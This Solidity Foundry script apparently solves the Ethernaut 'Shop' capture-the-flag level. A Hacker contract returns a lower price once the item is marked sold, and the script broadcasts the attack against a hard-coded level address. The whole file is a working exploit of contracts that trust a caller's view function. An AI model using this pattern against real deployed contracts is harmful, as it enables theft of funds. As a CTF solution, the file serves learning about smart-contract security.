//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Shop, Buyer} from "../src/Shop.sol";

contract Hacker {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function attack() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 90;
        }
        return 100;
    }
}

contract ShopSolution is Script {
    Shop public shop = Shop(0x5Bd8fE099F20cF897597628BD5EB1768A6C1e18c);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hacker hacker = new Hacker(shop);
        hacker.attack();
        vm.stopBroadcast();
    }
}
